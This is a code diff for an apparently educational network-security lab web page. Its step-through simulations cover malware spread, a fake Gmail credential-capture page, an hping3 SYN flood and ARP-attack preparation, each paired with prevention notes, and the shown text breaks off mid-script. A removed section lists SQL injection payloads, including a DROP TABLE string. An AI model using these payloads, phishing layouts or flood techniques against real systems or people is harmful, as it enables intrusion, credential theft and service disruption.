+  <p class="sdesc">Three dedicated simulations — Malware propagation, Phishing credential capture, and DDoS server overload. Each runs line by line with Next Step. Watch server load meters change in real time during the DDoS demo.</p>
 
-  <!-- B1: MALWARE (unchanged) -->
-  <!-- ... your existing B1 malware sim ... -->
+  <!-- B1: MALWARE -->
+  <div class="sim-layout cb1">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--red)">B1</span>Kali Linux — Malware Simulation (USB + Email)</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--red)">Kali Linux — malware_sim.py</span><span class="tver">Safe conceptual demo — no real harm</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-b1"><span class="tl tl-cmd"><span class="tp">┌──(root㉿kali)-[~/malware-demo]<br>└─# </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cb1">
+        <button class="btn-next" id="btn-b1">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('b1')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-b1" style="width:0%"></div></div><span class="prog-lbl" id="pl-b1">0 / 0</span></div>
+        <span class="sbadge2" id="sb-b1" style="background:rgba(239,68,68,.1);color:var(--red)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--red)">ATTACK VECTORS</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">→</span><span style="color:var(--muted)">USB autorun.inf on plug-in</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">→</span><span style="color:var(--muted)">Email .docx macro payload</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">→</span><span style="color:var(--muted)">Drive-by download via browser</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">→</span><span style="color:var(--muted)">SMB lateral movement in LAN</span></div>
+        </div>
+      </div>
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">PREVENTION</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Disable USB autorun (Group Policy)</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Real-time antivirus scanning</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Email sandbox attachment scan</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Network firewall segmentation</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-  <!-- B2: PHISHING (unchanged) -->
-  <!-- ... your existing B2 phishing sim ... -->
-
-  <!-- NEW: B2.5 SQL INJECTION DEMO -->
+  <!-- B2: PHISHING -->
   <div class="sim-layout cb2">
     <div>
-      <div class="step-label"><span class="step-num-badge" style="color:var(--amber)">B2.5</span>Web App — SQL Injection Vulnerability Demo</div>
-      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--amber)">Vulnerable Login Portal</span><span class="tver">simulated backend</span></div>
-      
-      <div class="sql-demo">
-        <div class="sql-bar">
-          <div style="color:var(--amber)">●</div>
-          <span>http://company-portal.local/login</span>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--amber)">B2</span>Python + HTML — Fake Gmail Phishing Page</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--amber)">Python HTTP Server — capture.py</span><span class="tver">Credential capture demo</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-b2"><span class="tl tl-cmd"><span class="tp">┌──(root㉿kali)-[~/phishing]<br>└─# </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cb2">
+        <button class="btn-next" id="btn-b2">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('b2')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-b2" style="width:0%"></div></div><span class="prog-lbl" id="pl-b2">0 / 0</span></div>
+        <span class="sbadge2" id="sb-b2" style="background:rgba(245,158,11,.1);color:var(--amber)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="phish-preview">
+        <div class="phish-bar">
+          <div class="phish-dots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div>
+          <div class="phish-url">🔴 http://gmai1-secure.com/login</div>
         </div>
-        <div class="sql-body">
-          <h3 style="margin-bottom:12px;color:#111">Employee Login</h3>
-          
-          <select id="sql-mode" style="width:100%;padding:8px;margin-bottom:12px;border-radius:4px">
-            <option value="vulnerable">🔴 Vulnerable Mode (No sanitization)</option>
-            <option value="secure">🟢 Secure Mode (Prepared Statements)</option>
-          </select>
+        <div class="phish-body">
+          <div class="glogo">Google</div>
+          <div class="gsub">Sign in to continue to Gmail</div>
+          <input class="ginput" type="email" placeholder="Email or phone" id="ph-email">
+          <input class="ginput" type="password" placeholder="Enter your password" id="ph-pass">
+          <button class="gbtn" onclick="doPhish()">Next</button>
+          <div class="creds-out" id="creds-out"></div>
+        </div>
+      </div>
+      <div class="icard" style="margin-top:10px">
+        <div class="icard-head" style="color:var(--amber)">RED FLAGS</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="color:var(--red)">⚠ "gmai1" not "gmail" in URL</div>
+          <div style="color:var(--red)">⚠ HTTP not HTTPS — no padlock</div>
+          <div style="color:var(--red)">⚠ Unknown third-party domain</div>
+          <div style="color:var(--green);margin-top:5px">✓ Prevention: Use MFA + password manager</div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-          <input type="text" id="sql-user" class="sql-input" placeholder="Username (try: admin)" value="admin">
-          <input type="text" id="sql-pass" class="sql-input" placeholder="Password (try: ' OR '1'='1)">
-          
-          <button class="sql-btn" onclick="runSQLInjection()">Login →</button>
-
-          <div class="sql-query-box" id="sql-query">SQL Query will appear here...</div>
-          
-          <div class="sql-result" id="sql-result" style="display:none"></div>
-
-          <div style="margin-top:18px">
-            <small style="color:var(--muted)">Common payloads to try:</small>
-            <div class="sql-payloads">
-              <div class="sql-payload" onclick="quickPayload(this)">admin' --</div>
-              <div class="sql-payload" onclick="quickPayload(this)">' OR '1'='1</div>
-              <div class="sql-payload" onclick="quickPayload(this)">' OR '1'='1' --</div>
-              <div class="sql-payload" onclick="quickPayload(this)">admin'; DROP TABLE users; --</div>
-            </div>
+  <!-- B3: DDoS -->
+  <div class="sim-layout cb3">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--pink)">B3</span>Kali Linux — DDoS with hping3 SYN Flood</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--pink)">Kali Linux — hping3</span><span class="tver">Target: 192.168.1.1:80</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-b3"><span class="tl tl-cmd"><span class="tp">┌──(root㉿kali)-[~]<br>└─# </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cb3">
+        <button class="btn-next" id="btn-b3">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('b3')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-b3" style="width:0%"></div></div><span class="prog-lbl" id="pl-b3">0 / 0</span></div>
+        <span class="sbadge2" id="sb-b3" style="background:rgba(236,72,153,.1);color:var(--pink)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--pink)">SERVER LOAD MONITOR</div>
+        <div class="icard-body">
+          <div class="ddos-bar-row">
+            <div class="ddos-lbl"><span style="color:var(--muted)">CPU Usage</span><span id="v-cpu" style="color:var(--text)">2%</span></div>
+            <div class="ddos-track"><div class="ddos-fill" id="d-cpu" style="width:2%;background:var(--green)"></div></div>
+          </div>
+          <div class="ddos-bar-row">
+            <div class="ddos-lbl"><span style="color:var(--muted)">Network I/O</span><span id="v-net" style="color:var(--text)">0 MB/s</span></div>
+            <div class="ddos-track"><div class="ddos-fill" id="d-net" style="width:0%;background:var(--blue)"></div></div>
+          </div>
+          <div class="ddos-bar-row">
+            <div class="ddos-lbl"><span style="color:var(--muted)">Open Conns</span><span id="v-conn" style="color:var(--text)">12</span></div>
+            <div class="ddos-track"><div class="ddos-fill" id="d-conn" style="width:1%;background:var(--cyan)"></div></div>
           </div>
         </div>
       </div>
-
-      <div class="ctrl cb2" style="margin-top:12px">
-        <button class="btn-reset" onclick="resetSQLDemo()">↺ Reset Demo</button>
-        <span class="sbadge2" id="sb-sql" style="background:rgba(245,158,11,.1);color:var(--amber)">TRY PAYLOADS</span>
-      </div>
-    </div>
-
-    <div class="side">
       <div class="icard">
-        <div class="icard-head" style="color:var(--amber)">HOW SQL INJECTION WORKS</div>
-        <div class="icard-body" style="font-size:12.5px;line-height:1.6">
-          <strong>Vulnerable query:</strong><br>
-          <code style="background:#111;color:#0f0;padding:2px 6px">SELECT * FROM users WHERE username = '$user' AND password = '$pass'</code><br><br>
-          Attacker input: <span style="color:var(--red)">' OR '1'='1</span><br>
-          → Becomes always-true condition → bypasses login.
+        <div class="icard-head" style="color:var(--green)">DEFENSE MEASURES</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">SYN cookies (kernel level)</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">fail2ban auto-block IPs</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Apache mod_ratelimit</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">CDN + load balancer</span></div>
         </div>
       </div>
-      <div class="icard" style="margin-top:12px">
-        <div class="icard-head" style="color:var(--green)">PREVENTION</div>
-        <div class="icard-body" style="font-size:12px">
-          <div style="color:var(--green)">✓ Use Prepared Statements / Parameterized Queries</div>
-          <div style="color:var(--green)">✓ Input validation + escaping</div>
-          <div style="color:var(--green)">✓ ORM (like SQLAlchemy, PDO)</div>
-          <div style="color:var(--green)">✓ Least privilege database user</div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- PART C                              -->
+<!-- ═══════════════════════════════════ -->
+<div id="partc" class="lab-sec">
+<div class="sw">
+  <div class="sec-eyebrow">
+    <span class="sbadge" style="background:rgba(16,185,129,.15);color:var(--green);border:1px solid rgba(16,185,129,.3)">PART C</span>
+    <span class="stag">Wireshark · Python matplotlib Dashboard</span>
+  </div>
+  <div class="stitle">Network Usage <span style="color:var(--green)">Analysis</span></div>
+  <p class="sdesc">Capture and analyse real application traffic — YouTube, Instagram, WhatsApp Web. Measure data consumption, identify TCP/UDP protocols, map servers contacted, and build a Python dashboard graph. Run each step to reveal findings.</p>
+
+  <!-- C1: Wireshark Capture -->
+  <div class="sim-layout cc">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--green)">C1</span>Wireshark — Capture App Traffic (YouTube / Instagram / WhatsApp)</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--green)">Wireshark 4.2 — wlan0 Capture</span><span class="tver">Live capture — 3 apps × 2 min</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-c1"><span class="tl tl-cmd"><span class="tp">user@machine:~$ </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cc">
+        <button class="btn-next" id="btn-c1">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('c1')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-c1" style="width:0%"></div></div><span class="prog-lbl" id="pl-c1">0 / 0</span></div>
+        <span class="sbadge2" id="sb-c1" style="background:rgba(16,185,129,.1);color:var(--green)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">DATA USAGE (2-min sessions)</div>
+        <div class="graph-wrap">
+          <div class="graph-bars">
+            <div class="bar-col"><div class="gbarval" id="gv1">0</div><div class="gbar" id="gb1" style="height:0%;background:var(--red)"></div><div class="gbarlbl">YouTube<br>4K</div></div>
+            <div class="bar-col"><div class="gbarval" id="gv2">0</div><div class="gbar" id="gb2" style="height:0%;background:var(--blue)"></div><div class="gbarlbl">YouTube<br>720p</div></div>
+            <div class="bar-col"><div class="gbarval" id="gv3">0</div><div class="gbar" id="gb3" style="height:0%;background:var(--purple)"></div><div class="gbarlbl">Insta<br>gram</div></div>
+            <div class="bar-col"><div class="gbarval" id="gv4">0</div><div class="gbar" id="gb4" style="height:0%;background:var(--green)"></div><div class="gbarlbl">WA<br>Web</div></div>
+            <div class="bar-col"><div class="gbarval" id="gv5">0</div><div class="gbar" id="gb5" style="height:0%;background:var(--amber)"></div><div class="gbarlbl">WA<br>Call</div></div>
+          </div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- B3: DDoS (unchanged) -->
-  <!-- ... your existing B3 ddos sim ... -->
+  <!-- C2: Wireshark packet table -->
+  <div class="sim-layout cc">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--cyan)">C2</span>Wireshark — Packet Analysis (TCP/UDP/DNS breakdown)</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--cyan)">Wireshark — Packet Table</span><span class="tver">Filter: tcp || udp || dns</span></div>
+      <div class="ws-box cc"><table class="wstable"><thead><tr><th>No.</th><th>Time</th><th>Source</th><th>Dest / Domain</th><th>Proto</th><th>Size</th><th>Info</th></tr></thead><tbody id="WS-c2"></tbody></table></div>
+      <div class="ctrl cc ws-box-ctrl cc">
+        <button class="btn-next" id="btn-c2">▶ Next Packet</button>
+        <button class="btn-reset" onclick="R('c2')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-c2" style="width:0%"></div></div><span class="prog-lbl" id="pl-c2">0 / 0</span></div>
+        <span class="sbadge2" id="sb-c2" style="background:rgba(16,185,129,.1);color:var(--green)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--red)">PRIVACY CONCERNS</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:7px">
+          <div style="padding:7px;background:rgba(239,68,68,.07);border-radius:5px;border:1px solid rgba(239,68,68,.18)"><div style="color:var(--red);font-weight:700">Tracking Cookies</div><div style="color:var(--muted);font-size:11px;margin-top:2px">Meta Pixel tracks users across all websites</div></div>
+          <div style="padding:7px;background:rgba(245,158,11,.07);border-radius:5px;border:1px solid rgba(245,158,11,.18)"><div style="color:var(--amber);font-weight:700">Data Sharing</div><div style="color:var(--muted);font-size:11px;margin-top:2px">YouTube reports watch history + device fingerprint</div></div>
+          <div style="padding:7px;background:rgba(139,92,246,.07);border-radius:5px;border:1px solid rgba(139,92,246,.18)"><div style="color:var(--purple);font-weight:700">3rd-party APIs</div><div style="color:var(--muted);font-size:11px;margin-top:2px">Hotjar, DoubleClick SDKs contact external servers</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
 
+  <!-- C3: Python Dashboard -->
+  <div class="sim-layout cc">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--green)">C3 BONUS</span>Python — matplotlib Network Dashboard Script</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--green)">Python 3.11 — network_dashboard.py</span><span class="tver">matplotlib + pandas</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-c3"><span class="tl tl-cmd"><span class="tp">user@machine:~/analysis$ </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cc">
+        <button class="btn-next" id="btn-c3">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('c3')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-c3" style="width:0%"></div></div><span class="prog-lbl" id="pl-c3">0 / 0</span></div>
+        <span class="sbadge2" id="sb-c3" style="background:rgba(16,185,129,.1);color:var(--green)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">OUTPUT FILES</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">network_report.png</span><span class="iv" style="color:var(--green)">Bar + Pie chart</span></div>
+          <div class="irow"><span class="ik">usage_data.csv</span><span class="iv" style="color:var(--cyan)">Raw data</span></div>
+          <div class="irow"><span class="ik">privacy_log.txt</span><span class="iv" style="color:var(--amber)">Tracker list</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
 </div>
 
-<!-- Rest of PART C and PART D remain unchanged -->
+<!-- ═══════════════════════════════════ -->
+<!-- PART D                              -->
+<!-- ═══════════════════════════════════ -->
+<div id="partd" class="lab-sec">
+<div class="sw">
+  <div class="sec-eyebrow">
+    <span class="sbadge" style="background:rgba(139,92,246,.15);color:var(--purple);border:1px solid rgba(139,92,246,.3)">PART D</span>
+    <span class="stag">Asterisk · Zoiper · Wireshark</span>
+  </div>
+  <div class="stitle">VoIP Study — <span style="color:var(--purple)">SIP & RTP Demo</span></div>
+  <p class="sdesc">Install Asterisk server, register Zoiper softphone clients as SIP extensions, place a real call, trace the SIP handshake in the Asterisk CLI, and capture RTP audio packets in Wireshark. Step through each phase.</p>
 
-<footer><p>// NETSEC Lab — Interactive Simulation • Now includes SQL Injection Demo • Educational & Safe Only</p></footer>
+  <!-- D1: Asterisk Setup -->
+  <div class="sim-layout cd">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--purple)">D1</span>Asterisk — Server Install & SIP Extension Config</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--purple)">Ubuntu Server — Asterisk 20</span><span class="tver">VoIP PBX configuration</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-d1"><span class="tl tl-cmd"><span class="tp">ubuntu@voip-server:~$ </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cd">
+        <button class="btn-next" id="btn-d1">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('d1')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-d1" style="width:0%"></div></div><span class="prog-lbl" id="pl-d1">0 / 0</span></div>
+        <span class="sbadge2" id="sb-d1" style="background:rgba(139,92,246,.1);color:var(--purple)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--purple)">VOIP CALL FLOW</div>
+        <div style="padding:10px 12px">
+          <div class="vf-step" id="vf1"><div class="vf-num">1</div><div><div class="vf-title">Voice Capture</div><div class="vf-sub">Mic → PCM audio @ 8kHz</div></div></div>
+          <div class="vf-step" id="vf2"><div class="vf-num">2</div><div><div class="vf-title">Codec Encode</div><div class="vf-sub">G.711 compression</div></div></div>
+          <div class="vf-step" id="vf3"><div class="vf-num">3</div><div><div class="vf-title">Packetize — RTP</div><div class="vf-sub">20ms UDP packets</div></div></div>
+          <div class="vf-step" id="vf4"><div class="vf-num">4</div><div><div class="vf-title">Transmit</div><div class="vf-sub">IP network delivery</div></div></div>
+          <div class="vf-step" id="vf5"><div class="vf-num">5</div><div><div class="vf-title">Reassemble</div><div class="vf-sub">Jitter buffer → playback</div></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- D2: SIP Call Trace -->
+  <div class="sim-layout cd">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--purple)">D2</span>Asterisk CLI — SIP Call Trace (Client A → Server → Client B)</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--purple)">Asterisk CLI — asterisk -rvvv</span><span class="tver">sip set debug on</span></div>
+      <div class="term-wrap"><div class="terminal" id="T-d2"><span class="tl tl-cmd"><span class="tp">asterisk*CLI&gt; </span><span class="tcursor"></span></span></div></div>
+      <div class="ctrl cd">
+        <button class="btn-next" id="btn-d2">▶ Next Step</button>
+        <button class="btn-reset" onclick="R('d2')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-d2" style="width:0%"></div></div><span class="prog-lbl" id="pl-d2">0 / 0</span></div>
+        <span class="sbadge2" id="sb-d2" style="background:rgba(139,92,246,.1);color:var(--purple)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">SIP PROTOCOL</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">Port</span><span class="iv" style="color:var(--green)">5060 / 5061</span></div>
+          <div class="irow"><span class="ik">Transport</span><span class="iv">TCP or UDP</span></div>
+          <div class="irow"><span class="ik">Purpose</span><span class="iv">Call setup</span></div>
+          <div class="irow"><span class="ik">Messages</span><span class="iv">INVITE,ACK,BYE</span></div>
+        </div>
+      </div>
+      <div class="icard" style="margin-top:10px">
+        <div class="icard-head" style="color:var(--purple)">RTP PROTOCOL</div>
+        <div class="icard-body">
+          <div class="irow"><span class="ik">Port</span><span class="iv" style="color:var(--purple)">Dynamic &gt;1024</span></div>
+          <div class="irow"><span class="ik">Transport</span><span class="iv">UDP only</span></div>
+          <div class="irow"><span class="ik">Purpose</span><span class="iv">Audio stream</span></div>
+          <div class="irow"><span class="ik">Codec</span><span class="iv">G.711 PCMU</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- D3: Wireshark VoIP -->
+  <div class="sim-layout cd">
+    <div>
+      <div class="step-label"><span class="step-num-badge" style="color:var(--cyan)">D3</span>Wireshark — Capture SIP + RTP Packets</div>
+      <div class="tool-bar"><div class="tdots"><span style="background:#ef4444"></span><span style="background:#f59e0b"></span><span style="background:#10b981"></span></div><span class="tname" style="color:var(--cyan)">Wireshark — VoIP Capture</span><span class="tver">Filter: sip || rtp</span></div>
+      <div class="ws-box cd"><table class="wstable"><thead><tr><th>No.</th><th>Time</th><th>Source</th><th>Destination</th><th>Protocol</th><th>Len</th><th>Info</th></tr></thead><tbody id="WS-d3"></tbody></table></div>
+      <div class="ctrl cd ws-box-ctrl cd">
+        <button class="btn-next" id="btn-d3">▶ Next Packet</button>
+        <button class="btn-reset" onclick="R('d3')">↺ Reset</button>
+        <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" id="pf-d3" style="width:0%"></div></div><span class="prog-lbl" id="pl-d3">0 / 0</span></div>
+        <span class="sbadge2" id="sb-d3" style="background:rgba(139,92,246,.1);color:var(--purple)">READY</span>
+      </div>
+    </div>
+    <div class="side">
+      <div class="icard">
+        <div class="icard-head" style="color:var(--green)">BENEFITS</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Low cost — no PSTN charges</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Scalable via config only</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--green)">✓</span><span style="color:var(--muted)">Works on any IP network</span></div>
+        </div>
+      </div>
+      <div class="icard" style="margin-top:10px">
+        <div class="icard-head" style="color:var(--red)">LIMITATIONS</div>
+        <div class="icard-body" style="font-size:12px;display:flex;flex-direction:column;gap:5px">
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">✗</span><span style="color:var(--muted)">Latency &gt;150ms causes echo</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">✗</span><span style="color:var(--muted)">Packet loss = choppy audio</span></div>
+          <div style="display:flex;gap:7px"><span style="color:var(--red)">✗</span><span style="color:var(--muted)">Fails during power outage</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+<footer><p>// NETSEC LAB — Interactive Simulation Guide &nbsp;·&nbsp; All attacks in isolated lab environments &nbsp;·&nbsp; Cisco Packet Tracer · Wireshark · Kali Linux · VirtualBox · Asterisk</p></footer>
 
 <script>
-// All your previous SIMS object and functions (N(), R(), doPhish(), etc.) remain exactly the same
+// ═══════════════════════════════
+// SIMULATION DEFINITIONS (COMPLETE)
+// ═══════════════════════════════
+const SIMS = {
 
-// NEW: SQL Injection Simulation Logic
-function runSQLInjection() {
-  const mode = document.getElementById('sql-mode').value;
-  const user = document.getElementById('sql-user').value.trim() || 'admin';
-  const pass = document.getElementById('sql-pass').value.trim();
-  const queryBox = document.getElementById('sql-query');
-  const resultBox = document.getElementById('sql-result');
+  a1:{type:'term',prompt:'PT> ',lines:[
+    {t:'header',s:'=== Cisco Packet Tracer 8.2 — Project: LAN_Security_Lab.pkt ==='},
+    {t:'cmd',s:'add device Router0  model=2911  ip=192.168.1.254'},
+    {t:'out',s:'[OK] Router0 added to topology'},
+    {t:'cmd',s:'add device Switch0  model=2960'},
+    {t:'out',s:'[OK] Switch0 added — 24 FastEthernet ports'},
+    {t:'cmd',s:'add device ServerVM  os=Ubuntu-Server-22  ip=192.168.1.1'},
+    {t:'out',s:'[OK] ServerVM placed on canvas → Fa0/1 on Switch0'},
+    {t:'cmd',s:'add device ClientA  os=Ubuntu-Desktop  ip=192.168.1.10'},
+    {t:'out',s:'[OK] ClientA placed on canvas → Fa0/2 on Switch0'},
+    {t:'cmd',s:'add device ClientB  os=Ubuntu-Desktop  ip=192.168.1.11'},
+    {t:'out',s:'[OK] ClientB placed on canvas → Fa0/3 on Switch0'},
+    {t:'cmd',s:'add device Attacker  os=Kali-Linux-2024  ip=192.168.1.99'},
+    {t:'out',s:'[OK] Attacker (Kali) placed on canvas → Fa0/4 on Switch0'},
+    {t:'cmd',s:'set subnet  all  192.168.1.0/24  gw=192.168.1.254'},
+    {t:'out',s:'[OK] Subnet 192.168.1.0/24 applied to all devices'},
+    {t:'cmd',s:'run simulation  ping  192.168.1.10 → 192.168.1.1'},
+    {t:'success',s:'Simulation result: 4 ICMP packets — 0% loss — TTL=64  [PASS]'},
+    {t:'cmd',s:'run simulation  ping  192.168.1.99 → 192.168.1.1'},
+    {t:'success',s:'Simulation result: 4 ICMP packets — 0% loss — TTL=64  [PASS]'},
+    {t:'blank',s:''},
+    {t:'success',s:'[+] LAN Topology complete. 4 VMs connected via Switch0.'},
+    {t:'info',s:'[i] Save as LAN_Security_Lab.pkt → use for screenshots in report.'},
+  ]},
 
-  let query = '';
-  let isSuccess = false;
-  let message = '';
+  a2:{type:'term',prompt:'ubuntu@server:~$ ',lines:[
+    {t:'comment',s:'# VirtualBox: Each VM → Settings → Network → Adapter 1 → Internal Network "intnet"'},
+    {t:'cmd',s:'sudo nano /etc/network/interfaces'},
+    {t:'out',s:'# /etc/network/interfaces (Server VM — 192.168.1.1)'},
+    {t:'out',s:'auto lo'},
+    {t:'out',s:'iface lo inet loopback'},
+    {t:'out',s:'auto eth0'},
+    {t:'out',s:'iface eth0 inet static'},
+    {t:'out',s:'    address   192.168.1.1'},
+    {t:'out',s:'    netmask   255.255.255.0'},
+    {t:'out',s:'    network   192.168.1.0'},
+    {t:'out',s:'    broadcast 192.168.1.255'},
+    {t:'cmd',s:'sudo systemctl restart networking && ip addr show eth0'},
+    {t:'success',s:'[OK] Network restarted'},
+    {t:'out',s:'2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500'},
+    {t:'out',s:'    inet 192.168.1.1/24 brd 192.168.1.255 scope global eth0'},
+    {t:'cmd',s:'arp -n  # check ARP cache before attack'},
+    {t:'out',s:'Address          HWtype  HWaddress           Flags Iface'},
+    {t:'out',s:'192.168.1.10     ether   0a:bb:cc:dd:ee:10   C     eth0'},
+    {t:'out',s:'192.168.1.11     ether   0a:bb:cc:dd:ee:11   C     eth0'},
+    {t:'success',s:'[OK] ARP cache shows REAL MAC addresses — no attack yet.'},
+    {t:'info',s:'[i] Repeat this /etc/network/interfaces config on ClientA (.10), ClientB (.11), Attacker (.99)'},
+  ]},
 
-  if (mode === 'vulnerable') {
-    // Vulnerable simulation
-    query = `SELECT * FROM users WHERE username = '${user}' AND password = '${pass}'`;
-    
-    // Classic bypass detection
-    if (pass.includes("'") || pass.toLowerCase().includes("or 1=1") || pass.includes("--") || pass.includes("drop table")) {
-      isSuccess = true;
-      message = `✅ <strong>LOGIN SUCCESSFUL!</strong><br>You are now logged in as <strong>ADMIN</strong>.<br><span style="font-size:11px">SQL Injection succeeded — authentication bypassed.</span>`;
-    } else if (user === 'admin' && pass === 'admin123') {
-      isSuccess = true;
-      message = `✅ Normal login successful (admin / admin123)`;
-    } else {
-      message = `❌ Login failed.`;
-    }
+  a3:{type:'term',prompt:'└─# ',lines:[
+    {t:'cmd',s:'echo 1 > /proc/sys/net/ipv4/ip_forward  # allow traffic forwarding'},
+    {t:'success',s:'[+] IP forwarding ENABLED — attacker machine will relay packets'},
+    {t:'cmd',s:'ifconfig eth0 | grep "inet "'},
+    {t:'out',s:'        inet 192.168.1.99  netmask 255.255.255.0'},
+    {t:'cmd',s:'cat /sys/class/net/eth0/address'},
+    {t:'out',s:'aa:bb:cc:dd:ee:99   <— attacker MAC'},
